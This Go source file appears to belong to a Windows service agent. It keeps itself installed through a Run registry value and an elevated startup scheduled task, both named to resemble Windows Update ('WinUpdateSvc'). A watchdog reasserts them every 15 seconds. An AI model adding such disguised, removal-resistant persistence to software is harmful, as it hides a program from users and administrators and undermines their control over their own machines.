//go:build windows

package lifecycle

import (
	"time"

	"github.com/kataras/golog"
	"golang.org/x/sys/windows/registry"
	"os/exec"
)

const runKeyPath = `Software\Microsoft\Windows\CurrentVersion\Run`
const runValueName = `WinUpdateSvc`
const taskName = "WinUpdateSvcWatchdog"

// ensureRunKey keeps a Run key entry pointing at the installed binary so the
// service can self-heal if removed.
func ensureRunKey(exePath string) {
	if !persistenceAllowed(exePath) {
		return
	}
	setRunKey(exePath + " --console")
}

// StartWatchdog periodically restarts the service if stopped and reinstalls if
// the service entry is missing. This ensures the SERVICE stays running in Session 0.
// The service itself handles spawning client processes in user sessions.
func StartWatchdog(installer Installer, svcCtrl ServiceController) {
	go func() {
		golog.Info("watchdog: Starting watchdog (ensures service persistence)")
		// Initial ensure so we don't wait for the first tick.
		installPath := installer.GetInstallPath()
		if persistenceAllowed(installPath) {
			golog.Debug("watchdog: Initial persistence setup")
			ensureRunKey(installPath)
			ensureScheduledTask(installPath)
		}
		ticker := time.NewTicker(15 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			if !persistenceAllowed(installPath) {
				golog.Info("watchdog: Persistence disabled, stopping watchdog")
				return
			}
			golog.Debug("watchdog: Periodic check")
			ensureRunKey(installPath)
			ensureScheduledTask(installPath)

			status, err := svcCtrl.Status()
			if err != nil || status == "unknown" {
				golog.Warnf("watchdog: Service status unknown, attempting reinstall")
				if err := installer.Install(); err != nil {
					golog.Warnf("watchdog: Reinstall failed: %v", err)
				}
				continue
			}

			if status != "running" {
				golog.Warnf("watchdog: Service not running (status: %s), attempting restart", status)
				if err := svcCtrl.Start(); err != nil {
					golog.Warnf("watchdog: Restart failed: %v", err)
				} else {
					golog.Info("watchdog: Service restarted successfully")
				}
			}
		}
	}()
}

func clearRunKey() {
	clearRunKeyRoots()
}

func setRunKeyRoots(path string) {
	// Try HKLM first for machine-wide persistence, then fall back to HKCU.
	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, runKeyPath, registry.SET_VALUE); err == nil {
		_ = k.SetStringValue(runValueName, path)
		_ = k.Close()
		return
	}
	if k, _, err := registry.CreateKey(registry.CURRENT_USER, runKeyPath, registry.SET_VALUE); err == nil {
		_ = k.SetStringValue(runValueName, path)
		_ = k.Close()
	}
}

func clearRunKeyRoots() {
	if k, err := registry.OpenKey(registry.LOCAL_MACHINE, runKeyPath, registry.SET_VALUE); err == nil {
		_ = k.DeleteValue(runValueName)
		_ = k.Close()
	}
	if k, err := registry.OpenKey(registry.CURRENT_USER, runKeyPath, registry.SET_VALUE); err == nil {
		_ = k.DeleteValue(runValueName)
		_ = k.Close()
	}
}

func ensureScheduledTask(exePath string) {
	if exePath == "" {
		return
	}
	args := []string{"/Create", "/F", "/SC", "ONSTART", "/RL", "HIGHEST", "/TN", taskName, "/TR", `"` + exePath + ` --console"`}
	_ = exec.Command("schtasks.exe", args...).Run()
}

func removeScheduledTask() {
	_ = exec.Command("schtasks.exe", "/Delete", "/F", "/TN", taskName).Run()
}
